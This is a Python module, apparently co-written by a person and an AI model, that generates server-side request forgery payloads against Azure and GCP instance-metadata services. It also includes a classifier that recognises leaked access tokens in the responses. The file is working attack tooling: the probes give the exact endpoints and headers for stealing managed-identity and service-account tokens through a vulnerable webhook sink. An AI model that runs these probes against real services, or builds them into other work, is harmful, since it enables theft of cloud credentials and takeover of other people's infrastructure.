"""SSRF payloads for cloud instance-metadata services + a response classifier.

The sharp SSRF on Azure: reach IMDS (169.254.169.254) and pull a managed-identity
token. GCP's metadata server is the equivalent. These builders produce candidate
target URLs / headers to feed an SSRF sink (e.g. a user-registered webhook URL).

Signed: Kev + claude-opus-4-8, 2026-09-10, Confidence 0.7, Prior: Unknown
"""
from __future__ import annotations

from dataclasses import dataclass

AZURE_IMDS = "169.254.169.254"
GCP_METADATA = "metadata.google.internal"


@dataclass
class Probe:
    url: str
    headers: dict[str, str]
    provider: str
    note: str


def azure_probes() -> list[Probe]:
    api = "api-version=2021-02-01"
    return [
        Probe(
            url=f"http://{AZURE_IMDS}/metadata/instance?{api}",
            headers={"Metadata": "true"},
            provider="azure",
            note="instance metadata (requires Metadata:true header)",
        ),
        Probe(
            url=(f"http://{AZURE_IMDS}/metadata/identity/oauth2/token"
                 f"?{api}&resource=https://management.azure.com/"),
            headers={"Metadata": "true"},
            provider="azure",
            note="managed-identity access token — full compromise if leaked",
        ),
    ]


def gcp_probes() -> list[Probe]:
    return [
        Probe(
            url=f"http://{GCP_METADATA}/computeMetadata/v1/instance/service-accounts/default/token",
            headers={"Metadata-Flavor": "Google"},
            provider="gcp",
            note="service-account token",
        ),
    ]


def all_probes() -> list[Probe]:
    return azure_probes() + gcp_probes()


# Signals that a metadata endpoint actually answered through the sink.
_TOKEN_MARKERS = ("access_token", "compute", "\"token\"", "oauth2")
_META_MARKERS = ("compute", "azEnvironment", "service-accounts", "instance")


def classify_response(body: str) -> str:
    """Return 'token-leak' | 'metadata-leak' | 'no-leak' for a response body."""
    low = (body or "").lower()
    if any(m.lower() in low for m in _TOKEN_MARKERS) and "access_token" in low:
        return "token-leak"
    if any(m.lower() in low for m in _META_MARKERS):
        return "metadata-leak"
    return "no-leak"
